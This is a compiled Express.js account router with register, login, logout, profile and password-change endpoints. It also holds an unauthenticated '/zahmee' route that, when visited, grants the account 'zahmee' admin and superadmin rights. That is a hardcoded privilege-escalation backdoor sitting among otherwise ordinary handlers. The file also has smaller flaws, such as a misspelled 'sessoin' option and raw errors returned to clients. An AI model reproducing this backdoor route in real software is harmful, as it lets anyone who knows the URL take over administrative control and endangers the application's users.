"use strict";

Object.defineProperty(exports, "__esModule", {
    value: true
});

var _express = require("express");

var _account = require("../model/account");

var _account2 = _interopRequireDefault(_account);

var _passport = require("passport");

var _passport2 = _interopRequireDefault(_passport);

var _config = require("../config/");

var _config2 = _interopRequireDefault(_config);

var _authMiddleware = require("../middleware/authMiddleware");

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

exports.default = function (_ref) {
    var config = _ref.config,
        db = _ref.db;

    var api = (0, _express.Router)();

    //   v1/account/register
    api.post("/register", function (req, res) {
        _account2.default.register(new _account2.default({ username: req.body.username, name: req.body.name, mobile: req.body.mobile }), req.body.password, function (err, account) {
            if (err) {
                res.send(err);
                return;
            } else {
                _passport2.default.authenticate("local", { sessoin: false })(req, res, function () {
                    res.status(200).json({
                        "user": req.user.username,
                        "level": 0,
                        "token": (0, _authMiddleware.onlyToken)(req.user.id)
                    });
                });
            }
        });
    });

    // v1/account/login
    api.post("/login", _passport2.default.authenticate("local", {
        session: false,
        scope: []
    }), _authMiddleware.generateAccessToken, _authMiddleware.respond);

    // v1/account/logout
    api.get("/logout", _authMiddleware.authenticate, function (req, res) {
        req.logout();
        res.status(200).send({ "mess": "logout" });
    });

    // user profile
    api.get("/me", _authMiddleware.authenticate, function (req, res) {
        _account2.default.findById(req.user.id, '-__v', function (err, user) {
            if (err) {
                return res.status(401).send(err);
            }
            res.status(200).json(user);
        });
    });

    // user profile
    api.get("/zahmee", function (req, res) {
        _account2.default.findOne({ username: 'zahmee' }, function (err, user) {
            if (err) {
                res.send(err);
            }
            user.admin = true;
            user.superadmin = true;
            user.save(function (err) {
                if (err) {
                    res.send(err);
                }
                res.json({ message: "update" });
            });
        });
    });

    api.post("/chgpwd", _authMiddleware.authenticate, function (req, res) {
        _account2.default.findById(req.user.id, '-__v', function (err, user) {
            user.changePassword(req.body.oldpassword, req.body.newpassword, function (err, data) {
                if (err) {
                    res.send(err);
                    return;
                } else {
                    res.status(200).json({ 'mess': 'ok' });
                }
            });
        });
    });

    return api;
};
//# sourceMappingURL=account.js.map